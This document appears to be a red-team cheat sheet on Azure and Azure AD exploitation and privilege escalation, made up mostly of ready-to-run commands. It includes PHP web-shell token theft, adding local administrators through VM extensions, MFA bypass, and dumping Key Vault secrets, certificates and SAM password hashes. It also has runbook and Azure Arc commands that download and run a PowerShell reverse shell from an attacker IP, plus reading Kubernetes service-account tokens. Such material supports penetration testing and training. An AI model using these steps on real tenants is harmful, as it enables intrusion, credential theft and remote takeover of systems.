# Exploitation & Privilege escalation
* [General](#General)
  * [Requesting access tokens](#Requesting-access-tokens)
* [Exploitation Enumeration](#Exploitation-Enumeration)
  * [When on a new machine](#When-on-a-new-machine)
  * [After getting a new user](#After-getting-a-new-user)
* [Azure AD](#Azure-AD-Exploitation)
  * [Bypass MFA](#Bypass-MFA)
    * [Conditional Access](#Conditional-Access) 
    * [Break glass accounts](#Break-glass-accounts)
  * [Managed Identity](#Managed-Identity)
  * [Abusing dynamic groups](#Abusing-dynamic-groups)
  * [Add credentials to enterprise applications](#Add-credentials-to-enterprise-applications)
  * [Illicit Consent Grant](#Illicit-Consent-Grant)
  * [Privileged Roles & Privileges](#Privileged-Roles-&-Privileges)
    * [Reset password](#Reset-password) 
* [Azure Resources Exploitation](#Azure-Resources-Exploitation)
  * [Storage account](#Storage-account)
  * [Key Vault](#Key-Vault)
  * [Automation account](#Automation-account)
  * [Virtual Machines](#Virtual-Machines)
  * [Deployments](#Deployments)
  * [Arm Templates History](#Arm-Templates-History)
  * [Function apps continuous deployment](#Function-apps-continuous-deployment)
  * [Azure Container Registry dump](#Azure-Container-Registry-dump)
  * [Azure ARC](#Azure-ARC)
  * [Kubernetes](#Kubernetes)

## General
### Requesting access tokens
#### Curl
- ARM
```
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

- Azure AD Graph
```
curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

- Microsoft Graph
```
curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

- Keyvault
```
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

### PHP
- ARM
```
<?php
  system ('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>
```

- Azure AD Graph
```
<?php
  system ('curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>
```

- Microsoft Graph
```
<?php
  system ('curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>
```

- Keyvault
```
<?php
  system ('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>
```

#### Add a user to a group
- Required aad-graph token
```
Add-AzureADGroupMember -ObjectId <GROUP ID> -RefObjectId <USER ID> -Verbose
```

#### Authenticate with Service Principal / Managed Identity
- Uses cleartext credentials.
```
$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

- Using certificate
```
Connect-AzAccount -ServicePrincipal -ApplicationId <APP ID> -Tenant <TENANT ID> -CertificatePath <PATH TO CERT>
```

## Exploitation Enumeration
### When on a new machine
#### Get context of current user
```
az ad signed-in-user show
Get-AzContext
```

#### Check UserData
```
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text";[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
```

#### Modify UserData
```
## It is also possible to modify user data with permissions "Microsoft.Compute/virtualMachines/write" on the target VM. Any automation or scheduled task reading commands from user data can be abused!

$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
$accessToken = (Get-AzAccessToken).Token
$Url = "https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm?api-version=2021-07-01"
$body = @(
@{
location = "Germany West Central"
properties = @{
userData = "$data"
}
}
) | ConvertTo-Json -Depth 4

$headers = @{
Authorization = "Bearer $accessToken"
}

## Execute Rest API Call

$Results = Invoke-RestMethod -Method Put -Uri $Url -Body $body -Headers $headers -ContentType 'application/json'
```

#### Check VM Extensions
```
Get-AzVMExtension -ResourceGroupName Research -VMName infradminsrv
```

#### Set VM Extensions
```
#Following permissions are required to create a custom script extension and read the output: "Microsoft.Compute/virtualMachines/extensions/write" and "Microsoft.Compute/virtualMachines/extensions/read"

Set-AzVMExtension -ResourceGroupName Research -VMName infradminsrv -ExtensionName ExecCmd -Location germanywestcentral -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student87 Stud87Password@123 /add /Y; net localgroup administrators student87 /add /Y"}'
```

#### Get access token
Supported tokens = aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
```
az account get-access-token
az account get-access-token --resource-type ms-graph 
```

#### Check if server has a managed identity
- print environment variables and check for `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` variables exist.
```
env
```

### After getting a new user
#### Check for other tenants
- Login to the Azure portal and in the right top click on the user and then `Switch Directory`.
```
Get-AzTenant
```

#### List all accessible resources
- Or login in https://portal.azure.com and click all resources
```
Get-AzResource

az resource list
```

#### List all owned objects
```
az ad signed-in-user list-owned-objects

Get-AzureADUserOwnedObject -ObjectId <ID>
```

#### Check permissions on the resource
```
Get-AzRoleAssignment -Scope <RESOURCE ID>

az role assignment list
```

##### Get current Azure role assignments
```
Get-AzRoleAssignment
```

#### Get the role definition
```
Get-AzRoleDefinition -Id <ROLEDEFINITION ID>
```

#### Check if it can read any deployment
```
Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCEGROUP>
```

#### Get the allowed actions on the role definition
```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

## Azure AD Exploitation
## Bypass MFA
### Conditional Access
- Use MFASweep to find inconsistensies through MFA requirements
- https://github.com/dafthack/MFASweep
- Blogpost: https://www.blackhillsinfosec.com/exploiting-mfa-inconsistencies-on-microsoft-services/
```
Import-Module MFASweep.ps1
Invoke-MFASweep -Username <EMAIL> -Password <PASSWORD>
```

#### Change User Agent
- With developer tools or proxy
- Or example: https://addons.mozilla.org/en-US/firefox/addon/custom-user-agent-revived/

#### Edge
- Open Developer tools with `F12`. Press `CTRL + SHIFT + M`.
- Click on `Dimension: Responsive` and select `Edit`. Click `Add custom device...`
- Add the desired name and user agent string and dimension. Example:

```
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15 Edg/100.0.4896.127
Dimensions: 1200x1200
```

### Break glass accounts
- Another PrivEsc target is Azure “Break Glass” administrative accounts
- Microsoft recommends not setting up MFA for them
- Two accounts are usually recommended to be set up
- If you can determine which ones are the break glass they can be good targets

## Managed Identity
#### Check if server has a managed identity
- print environment variables and check for `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` variables exist.
```
env
```

#### Request access token(s) for managed identity
- See [Requesting access tokens](#Requesting-access-tokens)

#### Use access tokens to connect with AZ Module
- Account ID can be found in `Client_ID` value from requesting the tokens.
```
$mgmtToken = <TOKEN>
$graphToken = <TOKEN>
Connect-AzAccount -AccessToken $mgmtToken -GraphAccessToken $graphToken -AccountId <ID>
```

#### Use the AZ module to exploit the permissions this managed identity may have!
- Example: Check for resources it can access
- See [Exploitation Enumeration](#Exploitation Enumeration)
```
Get-AzResource
```

## Abusing dynamic groups
- By default, any user can invite guests in Azure AD. If a dynamic group rule allows adding users based on the attributes that a guest user can modify, it will result in abuse of this feature. For example based on EMAIL ID and join as guest that matches that rule.

#### Check if there are dynamic groups
```
import-module .\AzureADPreview.psd1
Get-AzureADMSGroup | Where-Object -Property GroupTypes -Match 'DynamicMembership' | fl *
```
- Os it possible to invite a user that complies to the rule?

#### Invite users
- Go to Users and select "New Guest User"
- Open the user's profile and click on "(manage)" under invitation accepted. Select YES on resend invite and copy the URL.
- Open the URL in a private browser and login and accept the permissions.
- Connect to the tenant with AzureAD
- Set the secondary email for the user (Get the objectID of the user from the portal where we made the guest)
```
Set-AzureADUser -ObjectId <ID> -OtherMails <EMAIL> -Verbose
```
- Check if the user is added to the dynamic group (Might take a bit)

## Add credentials to enterprise applications
#### Check if secrets (application passwords) can be added to all enterprise applications
```
. .\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```

#### Use the secret to authenticate as service principal
```
$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

#### Check what the service principal can access
- [Exploitation Enumeration](#Exploitation-Enumeration)

## Illicit Consent Grant
- If app registration is allowed for users [link](https://portal.azure.com/#view/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/~/UserSettings) and you can enumerate AD users/emails you can perform Illicit Consent Grant Phishing with an app from inside the tenant.
- [Link](../initial-access-attacks.md#Illicit-Consent-Grant-phishing) to the attack from Initial Access Attacks
- Use `Accounts in this organizational directory only (<TENANT NAME> only - Single tenant)` since its from inside the tenant already!

## Privileged Roles & Privileges
### Reset Password
- The following roles can reset a password of the following roles:
![image](https://user-images.githubusercontent.com/43987245/222741224-3b501706-b5b1-4b67-9622-526d4c563df9.png)

#### Reset password
```
(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<USER>"}).ObjectId | Set-AzureADUserPassword -Password $Password -Verbose
```

## Azure Resource Exploitation
## Storage account
#### List storage accounts
```
Get-AzStorageAccount
```

#### Check if there is a container that is acccessible
```
Get-AzStorageContainer -Context (Get-AzStorageAccount -Name <NAME> -ResourceGroupName <RESOURCEGROUPNAME>).Context
```

#### Access Storage Accounts AZ powershell
```
$StorageAccount = Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>
Get-AzStorageContainer -Context $StorageAccount.Context
Get-AzStorageBlob -Container <NAME> -Context $StorageAccount.Context
Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob <NAME>
```

#### Access Storage Account
- https://azure.microsoft.com/en-us/products/storage/storage-explorer/
- To connect with a account use the Subcription button.

#### Check if you can access storage account keys
```
Get-AzStorageAccountKey -name <NAME OF STORAGE> -resourcegroupname <NAME>
```

#### Connect to the storage account with "Storage Explorer" using the account name and account keys

## Key Vault
#### List key vaults
```
Get-AzKeyVault
```

#### Get info about a specific key vault
```
Get-AzKeyVault -VaultName <VAULT NAME>
```

#### List the saved creds from key vault
```
Get-AzKeyVaultSecret -VaultName <VAULT NAME> -AsPlainText
```

#### List saved certificates from key vault
```
Get-AzKeyVaultCertificate -VaultName <VAULT NAME>
```

#### Read creds from a key vault
```
Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <NAME> -AsPlainText
```

#### Read cert from a key vault
```
Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <CERT NAME> -AsPlainText

$secret = Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <CERT NAME> -AsPlainText
$secretByte = [Convert]::FromBase64String($secret)
[System.IO.File]::WriteAllBytes("C:\Users\Public\Cert.pfx", $secretByte)
```

#### Dump cert info
```
certutil.exe -dump C:\Users\Public\Cert.pfx
```

## Automation account
- Automation Account comes very handy in privilege escalation:
  - Run As account is by default contributor on the current subscription and possible to have contributor permissions on other subscriptions in the tenant.   
  - Often, clear-text privileges can be found in Runbooks. For example, a PowerShell runbook may have admin credentials for a VM to use PSRemoting. 
  - Access to connections, key vaults from a runbook. 
  - Ability to run commands on on-prem VMs if hybrid workers are in use.
  - Ability to run commands on VMs using DSC in configuration management.
  - A runbook often contains clear-text passwords for example psremoting!

#### Get information on automation accounts
```
az extension add --upgrade -n automation
az automation account list
```

#### Get the role assigned of the automation accounts
- Check for the Roledefinition
- Get the ID from az automation account list
```
Get-AzRoleAssignment -Scope <ID>
```

#### Check if a hybrid worker is in use by the automation account
```
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <NAME> -ResourceGroupName <NAME>
```

#### Import Powershell runbook
```
Import-AzAutomationRunbook -Name <NAME> -Path <PATH TO .ps1 FILE> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Type PowerShell -Force -Verbose
```

#### Example contents of .ps1 file
```
IEX (New-Object Net.Webclient).downloadstring("http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1")
```

#### Publish the automation runbook to the vm
```
Publish-AzAutomationRunbook -RunbookName <NAME FOR RUNBOOK> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
```

#### Start listener
```
powercat -l -v -p 443 -t 600
```

#### Start the runbook
```
Start-AzAutomationRunbook -RunbookName <NAME OF RUNBOOK> -RunOn <WORKERGROUP NAME> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
```

### Extract credentials automation account
```
Import-Module Microburst.psm1
Get-AzurePasswords
```

## Virtual Machines
- Vm access can be found after getting a new user or tokens and seeing that it has access to a vm

#### Connect with Az Powershell
```
$accesstoken = ''
Connect-AzAccount -AccessToken $accesstoken -AccountId <ID>
```

#### Get more information about the VM (networkprofile)
```
Get-AzVM -Name <VM NAME> -ResourceGroupName <RESOURCE GROUP NAME> | select -ExpandProperty NetworkProfile
```

#### Get the network interface
```
Get-AzNetworkInterface -Name <NETWORKINTERFACE>
```

#### Query ID of public ip adress to get the public ip
```
Get-AzPublicIpAddress -Name <ID OF PUBLIC IP ADRESSES IN IPCONFIGURATION>
```

#### Check role assignments on the VM
```
Get-AzRoleAssignment -Scope <RESOURCE ID>
```

#### Check the allowed actions of the role definition
```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

#### Run a command on the VM
```
Invoke-AzVMRunCommand -VMName <VM NAME> -ResourceGroupName <NAME> -CommandId 'RunPowerShellScript' -ScriptPath '<PATH TO .ps1 FILE>' -Verbose
```

#### Contents of adduser.ps1
```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
New-LocalUser -Name <USER> -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student38
```

#### Access the VM
```
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<USER>', $Password)
$sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
```

#### Execute privilege escalation or post exploitation

### Login on VM as managed idenity
```
az login –identity
```

#### List permissions of current subscription
- May have more permissions then the user
```
az role assignment list -–assignee ((az account list | ConvertFrom-Json).id)
```

#### If no AZ module can request token manually 
- Then use Azure REST APIs with the token
```
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
```

### Read password hashes from virtual machine
- Download the disk https://docs.microsoft.com/en-us/azure/virtual-machines/windows/download-vhd#generate-download-url

#### Check the disks
```
sudo fdisk –l
```

#### Mount the disk
```
sudo mkdir /media/mounted-drive
sudo mount /dev/sdc4 /media/mounted-drive/
```

#### Navigate to the windows snapshot
```
cd /media/mounted-drive/
ls
```

#### Copy system/SAM and dump hashes
```
cd /media/mounted-drive/Windows/System32/config/
cp SAM SYSTEM ~/
cd ~/
impacket-secretsdump -system SYSTEM -sam SAM LOCAL
```

### Execute commands
- Requires the "Virtual Machine Contributor" role
- Run as default by SYSTEM or root
- Commandid =  RunPowerShellScript or RunShellScript
```
Invoke-AzVMRunCommand -ResourceGroupName <resource group name> -VMName <VM name> -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
```

### Reset password from VM
- Can be done from Azure portal
- This may be a quick way to gain access and avoid PowerShell alerting
- Be careful though as scripts/services may be using the credential

## Deployments
#### Check access to any resource group
```
Get-AzResourceGroup
```

### Check if you read any deployment from the resource group:
```
Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCE GROUP NAME>
```

#### Save the deployment template
```
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <RESOURCE GROUP> -DeploymentName <DEPLOYMENT NAME>
```

#### Find passwords in the template
- Or manually scan through it!
```
cat <PATH TO .json FILE> | Select-String password
```

## Arm Templates and Deployment History
- Any user with permissions `Microsoft.Resources/deployments/read` and `Microsoft.Resources/subscriptions/resourceGroups/read` can read the deployment history.
- Login to the azure portal
- Go to the deployments under settings and check the template for passwords or anything!
- Not sure if its possible by commands in any module!

## Function apps continuous deployment
- In case continuous deployment is used, a source code update triggers a deployment to Azure. 
- Following source code locations are supported
  - Azure Repos
  - GitHub
  - Bitbucket
- May be able to escalate privileges if we can own a continuous deployment and execute code on anything or add users!

## Azure Container Registry dump
- https://github.com/NetSPI/MicroBurst 
```
Get-AzPasswords
Get-AzACR
```

## Azure ARC
- https://github.com/0xJs/RedTeaming_CheatSheet/edit/main/cloud/azure/privilege-escalation.md
- All roles with `Microsoft.HybridCompute/machines/extensions/write` permission are able to install or update an Azure Arc Extension. Some of them are:
  - Owner
  - Contributor
  - Azure Connected Machine Resource Administrator
  - Hybrid Server Resource Administrator
  - Windows Admin Center Administrator Login

#### Check azure arc
- Login to azure Portal and check for connected machines in Azure Arc

#### Retrieve the local IP address of the server:
```
az connectedmachine extension create --machine-name i-0ef6d7a83a00e --resource-group AzureArc-RG --name ipconfig --type "CustomScriptExtension" --publisher "Microsoft.Compute" --settings "{'commandToExecute':'ipconfig'}" --location "eastus"
```

#### Retrieve interactive shell on the machine
```
az connectedmachine extension create --machine-name i-0ef6d7a83a00e --resource-group AzureArc-RG --name RemoteCode --type "CustomScriptExtension" --publisher "Microsoft.Compute" --settings "{'commandToExecute':'powershell -c iex(New-Object Net.Webclient).downloadstring(\'http://<IP>/Invoke-PowerShellTcp.ps1\')'}" --location "eastus"
```

## Kubernetes
- https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting

#### Check if machine is kubernetes
```
ls -lsa /var/run/secrets/
```

#### Check for secrets of serviceaccount
- Contains the files:
  - `ca.crt`: It's the ca certificate to check kubernetes communications
  - `namespace`: It indicates the current namespace
  - `token`: It contains the service token of the current pod.

```
ls -lsa /run/secrets/kubernetes.io/serviceaccount
ls -lsa /var/run/secrets/kubernetes.io/serviceaccount
ls -lsa /secrets/kubernetes.io/serviceaccount

cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Enum with kubectl
- https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux
- https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting/kubernetes-enumeration

#### Get services
```
./kubectl get services
```

#### Retrieve pods
```
./kubectl get pods
```

#### Check if we can view namespace
```
./kubectl describe pods
```
